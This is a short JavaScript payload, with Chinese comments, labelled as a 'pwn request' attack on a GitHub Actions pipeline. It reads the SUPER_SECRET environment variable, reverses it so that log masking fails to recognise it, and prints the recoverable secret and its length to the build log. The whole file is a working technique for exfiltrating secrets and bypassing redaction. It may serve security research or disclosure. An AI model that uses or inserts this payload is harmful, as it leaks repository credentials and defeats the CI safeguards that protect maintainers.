// === payload v3:反转字符串绕过日志脱敏,证明真值可还原 ===
const s = process.env.SUPER_SECRET || "";
const rev = s.split("").reverse().join("");
console.log("### PWN-REQUEST PAYLOAD EXECUTED ###");
console.log("event_name =", process.env.GITHUB_EVENT_NAME);
console.log("SECRET_LEN =", s.length);
console.log("SECRET_REV =", s ? rev : "(empty)");   // 反转后不匹配注册值 → 不被脱敏
console.log("### END ###");
